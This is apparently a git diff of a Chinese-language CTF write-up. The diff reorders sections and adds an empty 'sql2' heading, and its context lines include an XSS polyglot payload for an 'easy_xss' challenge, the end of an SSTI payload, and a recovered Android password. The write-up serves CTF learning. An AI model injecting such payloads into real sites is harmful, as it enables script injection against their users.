@@ -152,17 +152,19 @@ ssti注入漏洞，payload如下
 {% endfor %}
 ```
 
-# misc
-
-## all in base
-
-baseX Python爆破求解
-
 ## easy_xss
 
 hackbar 的 payload
 
 `jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert("flag") )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert("flag")//>\x3e`
+
+## sql2
+
+# misc
+
+## all in base
+
+baseX Python爆破求解
 
 # reverse
 
@@ -179,6 +181,7 @@ hackbar 的 payload
 ## swpu_easy_android
 
 反编译得到 check 类，在 idea 中运行测试得到密码为 `f53720bd5d9f07a8dc1028df48b8e1bb` ，登录进下一个界面。
+
 
 # crypto
 
